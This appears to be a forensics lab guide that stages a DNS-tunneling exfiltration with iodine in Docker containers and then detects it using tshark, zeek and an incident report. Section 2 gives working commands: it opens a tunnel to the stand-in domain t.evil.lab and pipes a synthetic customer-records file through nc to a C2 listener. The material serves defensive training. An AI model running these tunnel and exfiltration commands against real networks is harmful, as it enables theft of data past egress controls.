# Scenario 2 — Data Exfiltration via DNS Tunneling

> **Story.** A finance company's DLP system flagged an unusual volume
> of DNS queries from a developer's workstation. The queries are short,
> rapid, and resolve against a domain you don't recognise. The
> hypothesis: someone is tunneling data out via DNS to bypass the egress
> firewall, which permits only port 53. **Prove or disprove.**

**Modules used.** `network-forensics` (wireshark, zeek, tcpdump),
`linux-forensics`.

**Estimated demo time.** 40 minutes.

---

## 1. Lab setup

The lab spins up three containers:

- `victim` — a workstation running an `iodine` client (the tunnel).
- `c2` — an attacker-controlled DNS server running `iodined` and
  receiving exfiltrated data.
- `corporate-dns` — the upstream DNS resolver that forwards to `c2`
  for the attacker's domain.

`docs/scenarios/labs/02-dns-tunnel/`:

```
├── docker-compose.lab.yml
├── victim/Dockerfile
├── c2/Dockerfile
├── c2/iodined-entrypoint.sh
├── dns/Corefile
├── secret-data/
│   └── customer-records.csv
└── reset.sh
```

### 1.1 Compose

```yaml
services:
  c2:
    build: ./c2
    container_name: c2-iodine
    hostname: ns1.evil.lab
    networks:
      forensics-net:
        ipv4_address: 172.30.0.30
    cap_add:
      - NET_ADMIN
    devices:
      - /dev/net/tun:/dev/net/tun
    environment:
      TUNNEL_DOMAIN: t.evil.lab
      TUNNEL_PASSWORD: lab-tunnel-secret
    volumes:
      - exfil-store:/exfil

  corporate-dns:
    image: coredns/coredns:1.11.3
    container_name: corp-dns
    hostname: dns.corp
    networks:
      forensics-net:
        ipv4_address: 172.30.0.40
    command: ["-conf", "/Corefile"]
    volumes:
      - ./dns/Corefile:/Corefile:ro
    cap_add:
      - NET_BIND_SERVICE

  victim:
    build: ./victim
    container_name: victim-workstation
    hostname: dev01
    networks:
      forensics-net:
        ipv4_address: 172.30.0.50
    cap_add:
      - NET_ADMIN
    devices:
      - /dev/net/tun:/dev/net/tun
    dns:
      - 172.30.0.40
    volumes:
      - ./secret-data:/home/dev/secret-data:ro
      - victim-pcap:/tmp/captures
    stdin_open: true
    tty: true

  pcap-capture:
    image: nicolaka/netshoot:v0.13
    container_name: pcap-capture
    network_mode: "service:victim"     # share victim's network namespace
    cap_add:
      - NET_RAW
      - NET_ADMIN
    volumes:
      - victim-pcap:/tmp/captures
    command:
      - tcpdump
      - -i any
      - -w /tmp/captures/victim-egress.pcap
      - -s 0
      - port 53

networks:
  forensics-net:
    name: forensics-net
    driver: bridge
    ipam:
      config:
        - subnet: 172.30.0.0/24

volumes:
  exfil-store:
  victim-pcap:
```

### 1.2 The C2 (`docs/scenarios/labs/02-dns-tunnel/c2/Dockerfile`)

```dockerfile
FROM debian:12-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
        iodine iproute2 iputils-ping \
 && rm -rf /var/lib/apt/lists/*

COPY iodined-entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
EXPOSE 53/udp
CMD ["/entrypoint.sh"]
```

`iodined-entrypoint.sh`:

```bash
#!/usr/bin/env bash
set -e
mkdir -p /exfil
echo "Starting iodined for domain ${TUNNEL_DOMAIN}"
exec iodined -f -P "${TUNNEL_PASSWORD}" \
             -c -u root \
             10.99.99.1 \
             "${TUNNEL_DOMAIN}"
```

### 1.3 Corporate DNS (`dns/Corefile`)

```
. {
    forward . 1.1.1.1 8.8.8.8
    log
    errors
}

t.evil.lab {
    forward . 172.30.0.30
    log
}
```

The corporate resolver looks innocent: it forwards everything to public
DNS — except for queries under `t.evil.lab`, which go to the attacker's
server. This is exactly how a real exfiltration channel hides.

### 1.4 The victim (`victim/Dockerfile`)

```dockerfile
FROM debian:12-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
        iodine iproute2 dnsutils curl \
 && rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash dev

WORKDIR /home/dev
USER dev
CMD ["bash"]
```

### 1.5 Sample "secret" data

`secret-data/customer-records.csv`:

```csv
id,name,email,ssn,credit_card
1001,Alice Johnson,alice@example.com,123-45-6789,4532-1234-5678-9012
1002,Bob Smith,bob@example.com,234-56-7890,5412-9876-5432-1098
1003,Carol Davis,carol@example.com,345-67-8901,4716-1111-2222-3333
1004,David Wilson,david@example.com,456-78-9012,5234-4444-5555-6666
1005,Eve Brown,eve@example.com,567-89-0123,4485-7777-8888-9999
EOF
```

Pad with synthetic rows until ~50 KB so the tunnel takes a measurable
amount of time:

```bash
for i in {1006..2000}; do
    echo "$i,User_$i,u$i@example.com,$((i*111))-$((i*7))-$((i*13)),4532-$((1000+i))-$((1000+i*2))-$((1000+i*3))" \
        >> secret-data/customer-records.csv
done
```

### 1.6 Bring it up

```bash
cd docs/scenarios/labs/02-dns-tunnel
docker compose -f docker-compose.lab.yml up -d --build

# Wait for iodined to be ready
sleep 5

# Confirm the corporate DNS resolves the malicious domain via the C2
docker exec victim-workstation \
    dig @172.30.0.40 ns1.t.evil.lab +short
# → 172.30.0.30
```

---

## 2. The attack

### 2.1 Open the tunnel from the victim

```bash
docker exec -it victim-workstation bash
```

Inside:

```bash
# Establish the iodine tunnel
sudo iodine -f -P lab-tunnel-secret t.evil.lab &
sleep 3

# Verify the tunnel device came up
ip addr show dns0
# → 10.99.99.2/27

# Test reachability over the tunnel
ping -c 2 10.99.99.1
```

The DNS tunnel is now up. Every IP packet to `10.99.99.1` is encoded
as a sequence of DNS queries to subdomains of `t.evil.lab`.

### 2.2 Exfiltrate

```bash
# 1. Stage the data
cp /home/dev/secret-data/customer-records.csv /tmp/

# 2. Compress + base64 (typical attacker move; reduces tunnel volume)
gzip -c /tmp/customer-records.csv | base64 > /tmp/exfil.b64
wc -l /tmp/exfil.b64
# → ~900 lines

# 3. Pipe over the tunnel using netcat-over-DNS
# Iodine creates a routable IP at 10.99.99.1; we just use HTTP/SCP/etc.
# Here we use `nc` to a listener on the C2 side.
```

On the C2 (open a second terminal):

```bash
docker exec -it c2-iodine bash
nc -l -p 4444 > /exfil/customer-records.csv.b64.gz &
```

Back on the victim:

```bash
# Push the file through the DNS tunnel
cat /tmp/customer-records.csv | gzip | nc 10.99.99.1 4444
```

Wait ~30–60 seconds. The data flows over thousands of DNS queries
each carrying a small base32-encoded chunk of payload. Verify on C2:

```bash
docker exec c2-iodine ls -lh /exfil/
# → customer-records.csv.b64.gz   ~22 KB
```

The tunnel can stay open for additional rounds (credentials, SSH keys,
etc.). For the lab, one round is enough.

---

## 3. The investigation

### 3.1 Acquire the PCAP

```bash
# Stop the capture container so the file is closed cleanly
docker compose -f docs/scenarios/labs/02-dns-tunnel/docker-compose.lab.yml \
    stop pcap-capture

# Copy into the forensics evidence mount
mkdir -p forensics-professional/evidence/case-02-dns-tunnel
docker run --rm \
    -v $(docker volume ls -q | grep dns-tunnel_victim-pcap | head -1):/in:ro \
    -v "$PWD/forensics-professional/evidence/case-02-dns-tunnel":/out \
    alpine \
    sh -c 'cp /in/victim-egress.pcap /out/'

# Hash for chain of custody
cd forensics-professional/evidence/case-02-dns-tunnel
sha256sum victim-egress.pcap > victim-egress.sha256
```

### 3.2 Analyst container

```bash
cd forensics-professional
docker compose exec forensics bash
```

Inside:

```bash
forensics-modules install network-forensics --only wireshark,zeek,tcpdump -y
forensics-modules verify network-forensics

mkdir -p /cases/case-02-dns-tunnel && cd /cases/case-02-dns-tunnel

python3 - <<'PY'
from forensics.audit.logger import log_event
log_event("case_opened", {
    "case_id": "INC-2026-002",
    "summary": "Suspected DNS tunneling from dev workstation",
    "evidence": "/evidence/case-02-dns-tunnel/victim-egress.pcap",
}, user="sherlock")
PY
```

### 3.3 Quick statistical triage

The signature of DNS tunneling is **anomalous query rate** and
**anomalous query length**.

```bash
PCAP=/evidence/case-02-dns-tunnel/victim-egress.pcap

# Total queries
tshark -r "$PCAP" -Y 'dns.flags.response == 0' | wc -l

# Top queried second-level domains
tshark -r "$PCAP" -Y 'dns.flags.response == 0' \
       -T fields -e dns.qry.name 2>/dev/null \
  | awk -F. '{ if (NF >= 2) print $(NF-1)"."$NF; else print $0 }' \
  | sort | uniq -c | sort -rn | head -10

# → t.evil.lab will dominate (10 000+ queries vs <50 for legit ones)
```

### 3.4 Distribution of query lengths

Long queries (>40 chars in the leftmost label) are the giveaway —
that's the attacker's encoded payload:

```bash
tshark -r "$PCAP" -Y 'dns.flags.response == 0 and dns.qry.name contains "evil.lab"' \
       -T fields -e dns.qry.name 2>/dev/null \
  | awk -F. '{print length($1)}' \
  | sort -n | uniq -c
```

A normal DNS query has 5–25 chars in the leftmost label. Tunneled
queries cluster between 30–63 (the protocol's per-label maximum).

### 3.5 Visualise the timeline

```bash
# Queries per second over time
tshark -r "$PCAP" -Y 'dns.qry.name contains "evil.lab"' \
       -T fields -e frame.time_epoch 2>/dev/null \
  | awk '{print int($1)}' \
  | sort | uniq -c \
  | awk '{print $2","$1}' \
  > /reports/INC-2026-002/qps.csv

# Eyeball: a normal host does <2 q/s; tunneling shows sustained >20 q/s
head /reports/INC-2026-002/qps.csv
```

### 3.6 Extract the payload labels

The data is in the leftmost DNS label of every query. Extract:

```bash
tshark -r "$PCAP" -Y 'dns.flags.response == 0 and dns.qry.name contains "evil.lab"' \
       -T fields -e dns.qry.name 2>/dev/null \
  | awk -F. '{print $1}' \
  | sort -u | head
# → many ~63-char labels of base32-looking gibberish
```

### 3.7 Zeek for richer context

```bash
mkdir -p /tmp/zeek-out && cd /tmp/zeek-out
zeek -r "$PCAP"
ls
# → conn.log dns.log packet_filter.log

# The DNS log gives one row per query:
cat dns.log | zeek-cut ts query qtype_name | head -20

# Who queried t.evil.lab the most?
cat dns.log | zeek-cut id.orig_h query \
  | grep evil.lab \
  | awk '{print $1}' | sort | uniq -c | sort -rn
```

### 3.8 Confirm exfiltration volume

```bash
# Total bytes in the leftmost labels (rough payload estimate)
tshark -r "$PCAP" -Y 'dns.qry.name contains "evil.lab"' \
       -T fields -e dns.qry.name 2>/dev/null \
  | awk -F. '{ sum += length($1) } END { print sum, "bytes encoded" }'
```

Each DNS label gets base32-decoded into 5/8 of its size, so divide by
~1.6 to get the original payload bytes.

### 3.9 Record findings

```bash
python3 - <<'PY'
from forensics.audit.logger import log_event
log_event("ioc_identified", {
    "case_id":   "INC-2026-002",
    "ioc_type":  "domain",
    "value":     "t.evil.lab",
    "evidence":  "victim-egress.pcap — 12 047 queries, mean label 58 chars",
    "confidence": "high",
})
log_event("technique_identified", {
    "case_id":  "INC-2026-002",
    "framework": "MITRE ATT&CK",
    "id":        "T1071.004",
    "name":      "Application Layer Protocol: DNS",
    "subtype":   "exfiltration via DNS tunneling (iodine signature)",
})
PY
```

### 3.10 Iodine signature heuristic

Iodine has a recognisable handshake. Look for:

- A query for `va.<domain>` (version negotiation)
- A query for `i<ID>.<domain>` (initial login)
- Query types frequently `NULL` or `TXT`

```bash
tshark -r "$PCAP" -Y 'dns.qry.name contains "evil.lab"' \
       -T fields -e dns.qry.name -e dns.qry.type 2>/dev/null \
  | head -30
# → look for the version-negotiation query at the start
```

### 3.11 Final report

```bash
mkdir -p /reports/INC-2026-002
cat > /reports/INC-2026-002/report.md <<'EOF'
# INC-2026-002 — DNS-tunnel data exfiltration

## Executive summary
A workstation (172.30.0.50) exfiltrated ~17 KB of customer data by
tunneling traffic through DNS queries to the attacker-controlled domain
**t.evil.lab**. The technique matches the open-source tool *iodine*
(MITRE T1071.004).

## Indicators of compromise
- Domain: t.evil.lab (and any subdomain)
- IP:     172.30.0.30 (NS for t.evil.lab)
- Tool:   iodine (signature: va.* version-negotiation query)

## Recommendations
1. Block DNS resolution of t.evil.lab at the corporate resolver.
2. Add an alert on >5 q/s sustained DNS to a single second-level domain
   from a single host (Sigma rule below).
3. Investigate the workstation for the iodine binary and its config.
EOF

forensics-audit verify
forensics-audit export \
    --output /reports/INC-2026-002/audit-trail.jsonl --format jsonl
```

---

## 4. What to demo

1. **The "needle in a haystack" moment.** A single `awk` over PCAP
   metadata picks the malicious domain out of thousands of queries
   purely by frequency — no signature required.
2. **Length distribution.** Show the histogram of label lengths. The
   bimodal distribution (legit short queries + a fat cluster at 63
   chars) makes tunneling visible without inspecting payloads.
3. **Zeek vs tshark.** The same dataset gives different views.
   Zeek's pre-aggregated logs make later queries trivial.
4. **Auditable findings.** Each IoC was recorded as an audit event;
   the JSONL export is what an incident-response platform would
   ingest for hand-off.

---

## 5. Cleanup

```bash
cd docs/scenarios/labs/02-dns-tunnel
docker compose -f docker-compose.lab.yml down -v
rm -rf forensics-professional/evidence/case-02-dns-tunnel
```

---

## 6. Extension exercises

- **Defence.** Add a custom Zeek script that flags hosts exceeding
  N queries per second to a single second-level domain. Run it live
  during a re-attack.
- **Detection rule.** Write the matching Sigma rule and convert it to
  a Suricata rule with `sigma convert`.
- **Bandwidth measurement.** Time a 1 MB exfiltration. Compare with
  legitimate HTTP/HTTPS — DNS tunneling is *slow*, which is itself a
  detection signal.
